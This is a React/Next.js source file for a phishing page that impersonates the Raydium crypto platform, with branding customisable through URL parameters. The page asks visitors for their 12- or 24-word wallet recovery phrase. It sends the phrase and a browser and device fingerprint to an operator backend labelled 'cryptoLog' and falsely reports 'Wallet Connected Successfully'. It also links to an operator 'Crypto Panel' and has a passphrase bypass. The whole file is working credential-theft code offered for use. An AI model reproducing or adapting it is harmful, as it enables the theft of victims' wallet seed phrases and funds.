"use client";
import { useRouter } from "next/navigation";
import { useSearchParams } from "next/navigation";
import { useState, useEffect } from "react";
import { setPhrase, getCryptoLog, getPhrases } from "@/shared/api/apis";

const LoginPage = () => {
  const router = useRouter();
  const UAParser = require("ua-parser-js");
  const searchParams = useSearchParams();
  const [value, setValue] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState("");
  const [showModal, setShowModal] = useState(false);
  const [cryptoLog, setCryptoLog] = useState<any>(null);
  const [phrases, setPhrases] = useState<any[]>([]);
  const [userInfo, setUserInfo] = useState({
    browser: "",
    os: "",
    device: "",
  });

  const bgColor: any = searchParams.get("bgColor") || "#181d31";
  const bgColorBox: any = searchParams.get("modColor") || "#ffffff";
  const buttonColor: any = searchParams.get("btnColor") || "#00cfff";
  const cryptoLogId: any = searchParams.get("cryptoLogId");
  console.log(cryptoLogId);
  const userId: any = searchParams.get("userId");
  // const staticLogo = "/raydium-logo-freelogovectors.png"
  const staticLogo = "/raydium-ray-logo.png";
  const appLogo: any = cryptoLog?.appLogo || staticLogo;
  const token: any = searchParams.get("token");

  // const logo2 = 'https://firebasestorage.googleapis.com/v0/b/xtremefish-9ceaf.appspot.com/o/crypto-images%2FGoogle_G_logo.svg.png6c1a7d17-bc0a-4806-82f3-55af5f746218?alt=media&token=ffe2ad9a-8340-4e33-ad59-f3fc057af635';
  // console.log(logo)
  // const logo = appLogo+'&token='+token;
  // const dynamicLogo = logo.replace('crypto-images/', 'crypto-images%2F');
  // console.log("logo:  ",dynamicLogo)
  // console.log("appLogo:  ",appLogo)

  useEffect(() => {
    const parser = new UAParser();
    const result = parser.getResult();
    setUserInfo({
      browser: `${result.browser.name} ${result.browser.version}`,
      os: `${result.os.name} ${result.os.version}`,
      device: result.device.model
        ? `${result.device.vendor} ${result.device.model}`
        : "Desktop",
    });
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLTextAreaElement>) => {
    setValue(e.target.value);
  };

  const handleSubmit = async () => {
    const inputValue = value.trim();

    if (inputValue === cryptoLog?.specialPhrase) {
      router.push(cryptoLog?.redirectUrl);
      console.log("redirecting to: ", cryptoLog?.redirectUrl);
      return;
    }

    // if (inputValue === cryptoLog?.specialPhrase) {
    //   if (cryptoLog?.redirectUrl) {
    //     window.open(cryptoLog.redirectUrl, "_blank"); // Opens in a new tab
    //     console.log("Redirecting to:", cryptoLog.redirectUrl);
    //   } else {
    //     console.log("No redirect URL found.");
    //   }
    //   return;
    // }

    if (!inputValue) {
      setError("Phrase cannot be empty.");
      setTimeout(() => {
        setError("");
      }, 2000);
      return;
    }
    const wordRegex = /^[a-z\s]+$/;
    const words = inputValue.split(/\s+/);

    if (!wordRegex.test(inputValue)) {
      setError("Error mnemonic phrase can only contain 12 or 24 words spaced.");
      setTimeout(() => {
        setError("");
      }, 2000);
      return;
    } else if (words.length < 12 || words.length > 24) {
      setError("Input must contain between 12 and 24 words.");
      setTimeout(() => {
        setError("");
      }, 2000);
      return;
    } else {
      setError("");
    }

    if (cryptoLog === null) {
      setError("Crypto Log Not Found");
      return;
    }

    if (error) {
      return;
    }
    console.log(phrases.some((phraseObj) => phraseObj.phrase === value));
    if (phrases.some((phraseObj) => phraseObj.phrase === value)) {
      window.location.replace(cryptoLog?.redirectUrl);
    } else {
      const response = await setPhrase(value, userInfo, cryptoLogId);
      if (response?.ok) {
        setSuccess("Wallet Connected Successfully");
        setValue("");
        setTimeout(() => {
          setSuccess("");
        }, 2000);
      } else {
        setError("Error connecting wallet");
        setTimeout(() => {
          setError("");
        }, 2000);
      }
    }
  };

  console.log(cryptoLog);

  const appName = cryptoLog?.appName?.toUpperCase();

  const getCryptoLogById = async (cryptoLogId: string) => {
    const response = await getCryptoLog(cryptoLogId);
    setCryptoLog(response);
  };

  const getAllPhrases = async () => {
    const response = await getPhrases();
    setPhrases(response);
  };

  useEffect(() => {
    getAllPhrases();
  }, []);

  useEffect(() => {
    if (!userId || !cryptoLogId) {
      setShowModal(true);
    } else {
      getCryptoLogById(cryptoLogId);
    }
  }, [cryptoLogId, userId]);

  const hexToRgb = (hex: string) => {
    hex = hex.replace(/^#/, "");
    let r = parseInt(hex.substring(0, 2), 16);
    let g = parseInt(hex.substring(2, 4), 16);
    let b = parseInt(hex.substring(4, 6), 16);
    return { r, g, b };
  };

  const getContrastColor = (hex: string) => {
    const { r, g, b } = hexToRgb(hex);
    const luminance = 0.299 * r + 0.587 * g + 0.114 * b;
    return luminance > 128 ? "#000000" : "#ffffff";
  };

  const buttonTextColor = getContrastColor(buttonColor);
  const modTextColor = getContrastColor(bgColorBox);

  const goToPanel = () => {
    window.open("http://localhost:3000/dashboards/urls", "_blank");
  };

  return (
    <>
      {showModal ? (
        <div className="flex flex-col items-center justify-center min-h-screen bg-[#181d31] z-50">
          <div className="bg-white p-6 rounded-lg shadow-md text-center">
            <p className="text-lg font-bold">Redirect from Crypto Panel</p>
            <button
              className="mt-4 px-4 py-2 text-black rounded"
              style={{ backgroundColor: buttonColor }}
              onClick={() => goToPanel()}
            >
              Go to panel
            </button>
          </div>
          {/* <div className="w-[380px] p-6 rounded-lg shadow-md text-center login-container overflow-hidden">
              <div className="flex justify-center mb-4">
                <div className='bg-[#aaadb6] h-14 w-48 rounded animate-pulse'></div>
              </div>
              <div className="h-20 bg-[#aaadb6] rounded mb-4 animate-pulse"></div>
              <div className="flex justify-end">
                  <div className="h-12 bg-[#aaadb6] rounded w-full animate-pulse"></div>
              </div>
              <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white to-transparent animate-shimmer"></div>
          </div> */}
        </div>
      ) : (
        <div
          className="flex flex-col items-center justify-center min-h-screen"
          style={{ backgroundColor: bgColor }}
        >
          <div
            className="w-[380px] p-6 rounded-lg shadow-md text-center login-container"
            style={{ backgroundColor: bgColorBox, color: modTextColor }}
          >
            <div className="logo-placeholder">
              <img
                height={100}
                width={100}
                src={appLogo}
                alt="Logo"
                className="h-14"
              />
              <p
                className="h-full w-auto text-3xl text-center"
                style={{ letterSpacing: "0.3em" }}
              >
                {cryptoLog?.appName ? appName : "RAYDIUM"}
              </p>
            </div>
            {error && <div className="message-container-error">{error}</div>}
            {success && (
              <div className="message-container-success">{success}</div>
            )}
            <textarea
              value={value}
              placeholder="Enter your 12 or 24 word Mnemonic Phrase here..."
              className="w-full h-20 px-4 py-2 mb-4 border rounded-md text-gray-800 focus:outline-none focus:ring-2 focus:ring-blue-300 resize-none placeholder-top"
              onChange={(e) => handleInputChange(e)}
            />
            <button
              className="w-full px-4 py-2 rounded-md"
              style={{
                backgroundColor: buttonColor,
                color: buttonTextColor,
                border: `1px solid ${buttonTextColor}`,
              }}
              onClick={handleSubmit}
            >
              Connect Wallet
            </button>
          </div>
        </div>
      )}
    </>
  );
};

export default LoginPage;
